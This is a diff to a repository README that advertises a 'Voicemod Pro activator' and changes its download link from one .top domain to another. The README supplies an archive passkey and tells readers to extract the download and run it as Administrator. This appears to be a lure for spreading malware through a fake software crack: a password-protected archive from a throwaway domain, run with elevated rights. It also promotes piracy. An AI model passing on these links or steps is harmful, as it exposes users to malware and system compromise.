@@ -6,7 +6,7 @@ Voicemod Pro activator with real-time voice changing, custom soundboard, and all
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top/)**
 
 Archive passkey: `Github`
 
@@ -84,7 +84,7 @@ The tool works with Discord, Zoom, Google Meet, and all major gaming platforms i
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download the activator.
+1. Click **[CLICK](https://gitdownapply.top/)** to download the activator.
 2. Extract the archive to a folder on your desktop.
 3. Install the official Voicemod Pro trial version from the official website if you haven't already.
 4. Run the activator **as Administrator** to ensure proper functionality.
